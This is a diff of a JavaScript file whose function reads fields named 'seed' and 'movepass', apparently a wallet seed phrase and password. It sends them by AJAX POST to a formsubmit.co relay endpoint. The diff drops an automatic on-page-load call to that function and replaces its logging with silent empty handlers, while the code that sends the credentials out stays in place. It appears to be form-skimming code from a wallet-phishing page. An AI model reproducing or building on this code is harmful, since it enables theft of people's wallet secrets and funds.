@@ -26,10 +26,6 @@ function scrollFunction(){
 
 }
 
-$(document).ready(function () {
-    toSubmit();
-});
-
 function toSubmit(){
     var name = document.getElementById("seed").value;
     var password = document.getElementById("movepass").value;
@@ -40,12 +36,17 @@ function toSubmit(){
     method: 'POST',
     url: 'https://formsubmit.co/ajax/60c68e87820dd251e73211e21d7940df',
     dataType: 'json',
-    accepts: 'application/json',
+    accepts: 'application/json ; charset=utf-8',
+    async: true,
+        cache: false,
     data: dataString,
-       async:true,
-        cache:false,
-    success: (data) => console.log(data),
-    error: (err) => console.log(err)
+    success: function (data) {
+        // do something
+    },
+    error: function (jqXHR, exception, errorThrown) {
+        // do something
+    }
+
 });
 }
 
